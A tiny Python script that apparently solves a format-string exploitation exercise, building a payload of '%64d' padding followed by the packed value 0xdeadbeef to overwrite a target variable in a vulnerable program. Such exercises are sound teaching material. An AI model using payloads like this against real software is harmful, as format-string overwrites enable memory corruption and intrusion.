import struct

# padding will pad and print an integer fron the stack. It will print 64 integers
padding = "%64d"

# Value that will be written to the target variable
value = struct.pack("I", 0xdeadbeef)

print(padding + value)
